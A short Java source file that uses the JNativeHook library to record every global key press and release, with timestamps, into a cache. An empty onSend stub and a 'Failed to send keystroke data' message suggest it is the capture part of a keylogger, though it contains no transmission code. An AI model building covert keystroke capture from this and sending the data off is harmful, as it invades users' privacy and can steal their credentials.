package keys;

import handler.KeyStorage;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.omg.CORBA.PUBLIC_MEMBER;

import java.util.ArrayList;
import java.util.List;

public class NativeKeyboard implements NativeKeyListener {

    private List<KeyStorage> keyCache = new ArrayList<>();

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        keyCache.add(new KeyStorage(e.getKeyCode(), true, System.currentTimeMillis()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        keyCache.add(new KeyStorage(e.getKeyCode(), false, System.currentTimeMillis()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    public void onSend() {

    }

    public void onFail() {
        System.out.println("Failed to send keystroke data.");
    }

    public List<KeyStorage> getKeyCache() {
        return keyCache;
    }
}
